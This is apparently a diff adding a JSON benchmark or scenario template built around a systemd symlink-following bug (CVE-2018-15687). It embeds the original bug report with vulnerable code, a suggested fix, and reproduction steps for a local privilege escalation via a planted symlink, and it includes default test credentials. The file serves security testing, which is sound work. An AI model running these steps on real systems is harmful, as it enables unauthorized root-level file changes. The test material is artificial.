@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_45715",
+  "category": "C2_systemd",
+  "attack_technique": "T1543.002",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: systemd - 'chown_one()' Dereference Symlinks (CVE-2018-15687)\n\nExploit source code (45715.txt):\n```\n[I am sending this bug report to Ubuntu, even though it's an upstream\nbug, as requested at\nhttps://github.com/systemd/systemd/blob/master/docs/CONTRIBUTING.md#security-vulnerability-reports\n.]\n\nWhen chown_one() in the recursive chown logic decides that it has to change\nownership of a directory entry, it first changes ownership as follows:\n\n        if (name)\n                r = fchownat(fd, name, uid, gid, AT_SYMLINK_NOFOLLOW);\n        else\n                r = fchown(fd, uid, gid);\n        if (r < 0)\n                return -errno;\n\nSo far, this looks good. But then this happens:\n\n        /* The linux kernel alters the mode in some cases of chown(). Let's undo this. */\n        if (name) {\n                if (!S_ISLNK(st->st_mode))\n                        r = fchmodat(fd, name, st->st_mode, 0);\n                else /* There's currently no AT_SYMLINK_NOFOLLOW for fchmodat() */\n                        r = 0;\n        } else\n                r = fchmod(fd, st->st_mode);\n\nThis is dangerous, especially in the case where `name != NULL`.\n\nFirst off: I don't think that the overall objective of this code block makes\nsense. Yes, the kernel sometimes changes the mode when ownership is changed -\nbut that's only for set-UID binaries and set-GID binaries (but not\nset-GID directories).\nI'm pretty sure that setuid/setgid binaries aren't supposed to appear in these\ndirectories anyway.\n\nThe problem here is that, as the comment explains,\n`fchmodat(fd, name, st->st_mode, 0)` follows symlinks. The fchmodat() call is\nguarded by a `S_ISLNK(st->st_mode)` check, but that's obviously racy and\ntherefore doesn't actually help.\n\nMy recommended fix is to just remove the offending code block. If, for some\ncrazy reason, you actually want to support changing the ownership of\nsetuid/setgid binaries, an alternative might be to do something like this:\n\n    int fd2 = openat(fd, name, O_PATH|O_NOFOLLOW|O_CLOEXEC);\n    if (fd2 >= 0) {\n      fchmod(fd2, st->st_mode);\n      close(fd2);\n    }\n\nTo reproduce, as root, create a service with \"Restart=always\",\n\"StartLimitIntervalSec=0\", \"StateDirectory=test_service\" and \"User=user\" (where\n\"user\" is the name of an unprivileged account). Point \"ExecStart\" at a binary\nthat immediately exits:\n\n========\nint main(void) {\n  return 0;\n}\n========\n\nThen start the service.\n\nNext, as the user the service is running as, create some entries in\n/var/lib/test_service:\n\n========\nuser@ubuntu-18-04-vm:~$ cd /var/lib/test_service/\nuser@ubuntu-18-04-vm:/var/lib/test_service$ touch foo\nuser@ubuntu-18-04-vm:/var/lib/test_service$ chmod 0666 foo\nuser@ubuntu-18-04-vm:/var/lib/test_service$ ln -s /etc/hostname foo2\nuser@ubuntu-18-04-vm:/var/lib/test_service$ ln foo foo_link\nuser@ubuntu-18-04-vm:/var/lib/test_service$ ls -la\ntotal 8\ndrwxr-xr-x  2 user user 4096 Okt  8 16:42 .\ndrwxr-xr-x 67 root root 4096 Okt  8 15:30 ..\n-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo\nlrwxrwxrwx  1 user user   13 Okt  8 16:23 foo2 -> /etc/hostname\n-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo_\n```",
+  "cve": "CVE-2018-15687",
+  "exploitdb_id": "45715",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_45715",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
